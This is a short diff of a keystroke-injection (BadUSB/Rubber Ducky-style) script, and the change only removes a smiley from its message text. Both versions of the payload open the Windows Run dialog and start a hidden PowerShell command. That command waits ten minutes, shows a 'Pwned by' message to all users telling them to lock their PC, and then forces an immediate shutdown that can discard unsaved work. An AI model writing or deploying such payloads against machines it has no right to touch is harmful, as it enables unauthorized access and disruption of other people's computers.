@@ -1,5 +1,5 @@
 GUI r
 DELAY 250
-STRING powershell -WindowStyle Hidden -Command timeout 600; msg * Pwned by Venu2HD#1761. In the future, you should lock your PC when leaving it! :); timeout 10; shutdown /s /f /t 0
+STRING powershell -WindowStyle Hidden -Command timeout 600; msg * Pwned by Venu2HD#1761. In the future, you should lock your PC when leaving it!; timeout 10; shutdown /s /f /t 0
 DELAY 150
 ENTER
